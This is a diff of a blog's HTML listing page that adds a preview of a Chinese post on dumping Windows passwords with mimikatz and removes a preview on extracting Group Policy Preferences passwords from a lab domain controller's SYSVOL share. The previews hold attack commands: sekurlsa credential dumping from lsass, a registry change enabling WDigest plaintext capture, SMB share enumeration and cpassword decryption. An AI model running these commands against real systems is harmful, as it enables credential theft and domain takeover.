@@ -118,6 +118,34 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/" class="title">mimikatz抓取密码小记</a>
+    <section class="desc">
+  1、直接抓取本机：
+[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
+离线破解lsass.dmp
+[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
+[2]#privilege::debug          //提升权限
+[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
+[4]#sekurlsa::logonpasswords  //抓取密码
+踩坑点：
+[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
+解决方法：lsass.dmp要给完整路径，
+[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
+解决方法：使用2.0版本
+[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
+windows 2012之后明文抓取均会出现这个报错
+需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
+（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/" class="title">内网使用smb无文件执行</a>
     <section class="desc">
   创建smb共享
@@ -548,44 +576,6 @@ Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SES
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/" class="title">域内提权之滥用GGP</a>
-    <section class="desc">
-  在SYSVOL查找密码组策略首选项（GPP）中的密码
-原理：什么是GPP
-GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
-一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
-该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
-这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
-漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
-\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
-set l   
-nltest /DSGETDC:
-echo %logonserver%
-net time /domain
-......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
-smbmap -H 10.10.10.100  ###列出目标用户共享列表
----- -----------
-ADMIN$ NO ACCESS
-C$ NO ACCESS
-IPC$ NO ACCESS
-NETLOGON NO ACCESS
-replication read only   
-SYSVOL NO ACCESS
-Users NO ACCESS3、连接域共享
-smbclient //active.htb/Replication -N
-smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
-python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
-
-</section>
-    <p class="sub">Apr 25, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -599,6 +589,49 @@ python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记" href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; mimikatz抓取密码小记 &gt;</div>
+                            <div class="content flex1">
+                                
+  1、直接抓取本机：
+[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
+离线破解lsass.dmp
+[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
+[2]#privilege::debug          //提升权限
+[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
+[4]#sekurlsa::logonpasswords  //抓取密码
+踩坑点：
+[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
+解决方法：lsass.dmp要给完整路径，
+[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
+解决方法：使用2.0版本
+[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
+windows 2012之后明文抓取均会出现这个报错
+需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
+（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="内网使用smb无文件执行" alt="内网使用smb无文件执行" href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"
                        class="post-item swiper-slide flex flex-v">
@@ -1154,59 +1187,6 @@ Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SES
 时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
 6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
 
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="域内提权之滥用GGP" alt="域内提权之滥用GGP" href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="域内提权之滥用GGP" alt="域内提权之滥用GGP"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 域内提权之滥用GGP &gt;</div>
-                            <div class="content flex1">
-                                
-  在SYSVOL查找密码组策略首选项（GPP）中的密码
-原理：什么是GPP
-GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
-一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
-该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
-这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
-漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
-\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
-set l   
-nltest /DSGETDC:
-echo %logonserver%
-net time /domain
-......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
-smbmap -H 10.10.10.100  ###列出目标用户共享列表
----- -----------
-ADMIN$ NO ACCESS
-C$ NO ACCESS
-IPC$ NO ACCESS
-NETLOGON NO ACCESS
-replication read only   
-SYSVOL NO ACCESS
-Users NO ACCESS3、连接域共享
-smbclient //active.htb/Replication -N
-smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
-python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 
 
                             </div>
